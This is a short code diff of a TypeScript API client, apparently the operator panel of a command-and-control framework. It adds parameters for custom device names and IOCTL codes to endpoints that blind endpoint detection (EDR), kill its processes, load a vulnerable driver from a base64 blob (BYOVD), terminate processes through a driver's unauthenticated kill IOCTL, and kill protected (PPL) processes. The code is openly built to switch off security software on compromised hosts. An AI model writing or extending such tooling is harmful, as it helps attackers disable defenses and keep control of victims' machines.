@@ -106,12 +106,12 @@ export const sessionApi = {
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/blind`, {}),
   edrKill: (id: string, processes?: string[]) =>
     api.post<{ task_id: number; task_type: string; count: number; message: string }>(`/sessions/${id}/edr/kill`, { processes }),
-  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string }) =>
+  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string; name?: string; kill_ioctl?: string; description?: string }) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
   byovdUnload: (id: string, serviceName?: string) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
   /** BYOVD 驱动击杀：按 PID 或进程名调用内置驱动的无鉴权终止 IOCTL */
-  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string }) =>
+  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string; device?: string; ioctl?: string }) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-kill`, payload),
   pplKill: (id: string, processes?: string[]) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
